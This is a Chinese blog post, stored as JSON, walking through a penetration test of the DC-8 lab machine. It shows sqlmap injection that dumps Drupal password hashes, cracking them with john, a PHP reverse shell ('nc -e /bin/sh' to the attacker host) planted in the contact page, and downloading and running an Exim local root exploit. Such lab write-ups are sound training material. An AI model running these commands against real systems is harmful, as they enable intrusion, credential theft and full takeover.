{"title":"DC-8靶机渗透","uid":"a9be34afb12b0e30cb59efc97ce55ff4","slug":"DC-8靶机渗透","date":"2023-01-06T12:46:44.520Z","updated":"2023-01-08T08:28:00.522Z","comments":true,"path":"api/articles/DC-8靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-vgzygl.jpg","content":"<h1 id=\"DC-8靶机渗透全流程\"><a href=\"#DC-8靶机渗透全流程\" class=\"headerlink\" title=\"DC-8靶机渗透全流程\"></a>DC-8靶机渗透全流程</h1><h2 id=\"一-实验环境\"><a href=\"#一-实验环境\" class=\"headerlink\" title=\"一:实验环境\"></a>一:实验环境</h2><p>kali攻击机: 192.168.2.104</p>\n<p>DC-8靶机: 192.168.2.105</p>\n<h2 id=\"二-信息收集\"><a href=\"#二-信息收集\" class=\"headerlink\" title=\"二:信息收集\"></a>二:信息收集</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p><code>arp-scan -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106210108585.png\" alt=\"image-20230106210108585\"></p>\n<p>发现靶机IP地址:<code>192.168.2.105</code></p>\n<h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p><code>nmap -A 192.168.2.105</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106210258104.png\" alt=\"image-20230106210258104\"></p>\n<p>发现靶机开放端口<code>22,80</code>,同时发现cms是<code>drupal 7</code></p>\n<h3 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h3><p><code>dirsearch -u http://192.168.2.105/ -e*</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106212513212.png\" alt=\"image-20230106212513212\"></p>\n<h3 id=\"web信息收集\"><a href=\"#web信息收集\" class=\"headerlink\" title=\"web信息收集\"></a>web信息收集</h3><p>访问靶机web页面<code>http://192.168.2.105</code></p>\n<p>发现url可以传参</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106212610672.png\" alt=\"image-20230106212610672\"></p>\n<p>测试sql注入</p>\n<p>构造<code>http://192.168.2.105/?nid=1&#39; -- aa</code>发现web界面报错,说明我们存在sql注入</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106212743307.png\" alt=\"image-20230106212743307\"></p>\n<h2 id=\"三-渗透测试\"><a href=\"#三-渗透测试\" class=\"headerlink\" title=\"三:渗透测试\"></a>三:渗透测试</h2><h3 id=\"sqlmap尝试注入\"><a href=\"#sqlmap尝试注入\" class=\"headerlink\" title=\"sqlmap尝试注入\"></a>sqlmap尝试注入</h3><p>既然存在sql注入,使用sqlmap来试试</p>\n<p><code>sqlmap -u &quot;http://192.168.2.105/?nid=1&quot;</code></p>\n<p>发现存在多种注入漏洞</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106213150899.png\" alt=\"image-20230106213150899\"></p>\n<p>爆库名</p>\n<p><code>sqlmap -u &quot;http://192.168.2.105/?nid=1&quot; --dbs</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106213310293.png\" alt=\"image-20230106213310293\"></p>\n<p>爆表名</p>\n<p><code>sqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db --tables</code></p>\n<p>从爆出来的一堆表名中看到了一个user表</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106213443086.png\" alt=\"image-20230106213443086\"></p>\n<p>爆字段</p>\n<p><code>sqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db -T users --columns</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106213536147.png\" alt=\"image-20230106213536147\"></p>\n<p>查询信息</p>\n<p><code>sqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db -T users -C &quot;uid,name,pass&quot; --dump</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106213704560.png\" alt=\"image-20230106213704560\"></p>\n<p>得到了加密信息</p>\n<h3 id=\"john解密\"><a href=\"#john解密\" class=\"headerlink\" title=\"john解密\"></a>john解密</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z\njohn:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF</code></pre>\n\n<p>将密文放入dc-8.txt,然后用john进行破解</p>\n<p><code>john dc-8.txt</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106215322086.png\" alt=\"image-20230106215322086\"></p>\n<p>只破译出了john用户,admin破译不出来(尝试了十几分钟)</p>\n<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>通过之前的目录扫面我们知道了有用户登录页面</p>\n<p><code>http://192.168.2.105/user/login</code></p>\n<p>用破解出来的账户登录</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106215646618.png\" alt=\"image-20230106215646618\"></p>\n<p>进入了后台就可以尝试寻找能够上传php代码的地方写shell了</p>\n<p>经过一番查找发现在contact us页面可以修改</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220159774.png\" alt=\"image-20230106220159774\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220226758.png\" alt=\"image-20230106220226758\"></p>\n<p>写入shell</p>\n<p><code>&lt;?php system(&quot;nc -e /bin/sh 192.168.2.104 444&quot;); ?&gt;</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220433483.png\" alt=\"image-20230106220433483\"></p>\n<p>保存后访问该页面,同时记得kali开启监听</p>\n<p><code>nc -lvp 444</code></p>\n<p>然后回到view页面,提交</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220717466.png\" alt=\"image-20230106220717466\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220734097.png\" alt=\"image-20230106220734097\"></p>\n<p>成功拿到shell</p>\n<p>获得交互式界面<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106220846105.png\" alt=\"image-20230106220846105\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>查找SUID位的程序</p>\n<p><code>find / -perm -u=s -user root 2&gt;/dev/null</code></p>\n<p>#-perm根据权限查找, -u&#x3D;s包含suid位的程序 -user root属主是root用户的, 2&gt;&#x2F;dev&#x2F;null 错误信息扔进垃圾桶</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106234126969.png\" alt=\"image-20230106234126969\"></p>\n<p>debian发行版(包括Ubuntu)使用exim4作为默认的邮件服务器</p>\n<p>centos使用postfix作为默认的邮件服务器,早先版本使用的是sendmail</p>\n<p>看其版本</p>\n<p><code>/usr/sbin/exim4 --version</code></p>\n<p>或者</p>\n<p><code>exim4 --version</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106224547013.png\" alt=\"image-20230106224547013\"></p>\n<p>使用searchsploit来寻找版本漏洞</p>\n<p><code>searchsploit exim 4</code></p>\n<p>找到对应漏洞</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106224730041.png\" alt=\"image-20230106224730041\"></p>\n<p>把脚本镜像到当前目录</p>\n<p><code>searchsploit -m 46996.sh</code></p>\n<p>或者</p>\n<p><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh /root/Desktop</code>复制到桌面</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106235002077.png\" alt=\"image-20230106235002077\"></p>\n<p>利用python架设一个简单的http服务器让靶机来下载脚本</p>\n<p>先用<code>python -V</code>查看python版本</p>\n<p>python2用: <code>python2 -m SimpleHTTPServer 2222</code></p>\n<p>python3用: <code>python3 -m http.server 2222</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106235420967.png\" alt=\"image-20230106235420967\"></p>\n<p>在靶机中下载脚本，只能在靶机的tmp目录下下载，因为&#x2F;tmp目录的权限大</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimg_for_typoraimage-20230106225711582.png\" alt=\"image-20230106225711582\"></p>\n<p><code>wget http://192.168.2.104:2222/46996.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106235633332.png\" alt=\"image-20230106235633332\"></p>\n<p>或者</p>\n<p>可以将脚本放到攻击机的apache目录下，然后再使用获得的靶机的shell下载</p>\n<p>或者也可以在此链接直接下载该exp：<a href=\"https://www.exploit-db.com/exploits/46996\">https://www.exploit-db.com/exploits/46996</a></p>\n<p>复制脚本到目录&#x2F;var&#x2F;www&#x2F;html下:<code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106230722342.png\" alt=\"image-20230106230722342\"></p>\n<p>启动apache服务:<code>service apache2 start</code></p>\n<p><code>wget http://192.168.2.104/46996.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106230951688.png\" alt=\"image-20230106230951688\"></p>\n<p>此时脚本是没有执行权限的,我们要手动添加执行权限<code>chmod +x 46996.sh</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230107000330009.png\" alt=\"image-20230107000330009\"></p>\n<p> 根据exp的提示，执行该脚本<code>./46996.sh -m netcat</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230107001549259.png\" alt=\"image-20230107001549259\"></p>\n<p>提权成功</p>\n<p>注意过一段时间后连接就会断开,要重新执行脚本才行,所以操作要快</p>\n<p>找到flag</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230107001619445.png\" alt=\"image-20230107001619445\"></p>\n<h3 id=\"ps\"><a href=\"#ps\" class=\"headerlink\" title=\"ps\"></a>ps</h3><p>如果版本过低,可能会遇到执行脚本报错问题</p>\n<p>原因是：shell.sh文件的格式为dos格式。linux只能执行格式为unix格式的脚本。</p>\n<p>使用set ff&#x3D;unix : 告诉 vim 编辑器，使用unix换行符，不然会无法执行脚本。</p>\n<p>所以修改一下攻击机目录下的shell脚本，在脚本最后加上<code>set ff=unix</code></p>\n","feature":true,"text":"DC-8靶机渗透全流程一:实验环境kali攻击机: 192.168.2.104 DC-8靶机: 192.168.2.105 二:信息收集主机发现arp-scan -l 发现靶机IP地址:192.168.2.105 端口扫描nmap -A 192.168.2.105 发现靶机开放端...","link":"","photos":[],"count_time":{"symbolsCount":"2.6k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":7,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#DC-8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%85%A8%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">DC-8靶机渗透全流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">一:实验环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">二:信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">主机发现</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">端口扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">目录扫描</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">web信息收集</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">三:渗透测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap%E5%B0%9D%E8%AF%95%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">sqlmap尝试注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#john%E8%A7%A3%E5%AF%86\"><span class=\"toc-text\">john解密</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">反弹shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ps\"><span class=\"toc-text\">ps</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"系统安全-Linux操作系统","uid":"ba8a2682be8b63e52959cbada397fdd0","slug":"Linux操作系统","date":"2023-01-08T03:00:55.056Z","updated":"2023-01-08T04:26:11.031Z","comments":true,"path":"api/articles/Linux操作系统.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-zyx9lw.jpg","text":"一:Linux操作系统概述Linux操作系统介绍及作用介绍​ 目前业界客户端大多采用Windows系统，而服务端大多数使用的是Linux，究其根源主要是开源免费，安全性高，支持多用户，支持关闭任意不需要的功能和对硬件资源要求低等因素。同时，Linux也是众多开源产品首先支持的平台...","link":"","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"操作系统安全","slug":"操作系统安全","count":1,"path":"api/categories/操作系统安全.json"}],"tags":[{"name":"Linux","slug":"Linux","count":1,"path":"api/tags/Linux.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"DC-7靶机渗透","uid":"c1eb72cb53103af9058bb7d0064dfe74","slug":"DC-7靶机渗透","date":"2023-01-05T14:52:06.100Z","updated":"2023-01-08T08:27:54.779Z","comments":true,"path":"api/articles/DC-7靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-p988vp_3840x2160.png","text":"DC-7靶机渗透全流程一:实验环境kali攻击机: 192.168.2.103 DC-7靶机: 192.168.2.105 二:信息收集主机发现arp-scan -l 端口扫描1.masscan快速扫描端口 masscan --rate=10000 --ports 0-65535...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":7,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}